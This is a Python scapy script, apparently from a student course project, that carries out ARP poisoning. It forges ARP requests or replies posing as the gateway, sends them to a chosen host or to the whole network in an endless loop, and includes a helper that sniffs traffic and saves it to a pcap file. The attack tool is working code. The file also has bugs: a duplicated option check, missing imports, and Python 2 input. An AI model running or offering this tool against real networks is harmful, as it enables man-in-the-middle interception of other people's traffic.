# -*- coding: UTF-8 -*-

# from scapy.all import *
import os
import sys
from optparse import OptionParser
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)
# from scapy.all import *


def main():
    # 格式化输入
    usage = 'Usage: %prog [-i my_interface] [-t target_ip] [-p gatewayip] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='my_interface', help='Specify the my_interface to use')
    parser.add_option('-t', dest='target_ip', help='Specify a particular host to ARP poison')
    parser.add_option('-p', dest='gatewayip', help='Specify gateway IP')
    parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
    parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
    (options, args) = parser.parse_args()

    if options.my_interface is None or options.my_interface is None or options.gatewayip is None:
        parser.print_help()
        print("\n\nInput format error.\n")
        sys.exit(0)

    # get_if_hwaddr为获取本机网络接口的函数，getmacbyip是通过ip地址获取其Mac地址的方法，ARP是构建ARP数据包的类，Ether用来构建以太网数据包，sendp方法在第二层发送数据包。
    mac = get_if_hwaddr(options.my_interface)

    # 构建请求包
    def build_req():
        if options.target_ip is None:
            # 若无目标地址，则广播数据包
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=options.gatewayip, op=1)
        elif options.target_ip:
            target_mac = getmacbyip(options.target_ip)
            if target_mac is None:
                print("[-] Error: Could not resolve targets MAC address.")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=options.gatewayip, hwdst=target_mac, pdst=options.target_ip, op=1)

        return pkt

    def build_rep():
        if options.target_ip is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=options.gatewayip, op=2)
        elif options.target_ip:
            target_mac = getmacbyip(options.target_ip)
            if target_mac is None:
                print("[-] Error: Could not resolve targets MAC address.")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=options.gatewayip, hwdst=target_mac, pdst=options.target_ip, op=2)

        return pkt

    # 检查用户输入所要求的模式
    if options.mode == "req":
        pkt = build_req()
    if options.mode == "rep":
        pkt = build_rep()

    # 检查是否需要最终确认
    if options.summary is True:
        pkt.show()
        ans = raw_input('\n[*] Continue? [Y|N]: ').lower()
        if ans == 'y' or len(ans) == 0:
            pass
        else:
            sys.exit(0)
    
    while True:
        sendp(pkt, inter=2, iface=options.my_interface)


def get_packge():
    # 抓包
    # dpkt = sniff(filter = "tcp", count = 1, prn = lambda x: x.show())  # 只接收tcp的包
    dpkt = sniff(filter="host 192.168.43.1", count = 1, prn = lambda x: x.summary())  # 只接收tcp的包
    # dpkt = sniff(count = 100)  # 抓取100个包
    wrpcap('/home/roxbili/Desktop/Computer_course_design/demo.pcap', dpkt)  # 将上述抓取的包保存为pcap格式。
    print(dpkt)     # 输出捕获到的数据包
    print(len(dpkt))    # 抓包个数





if __name__ == "__main__":
    # get_packge()
    main()
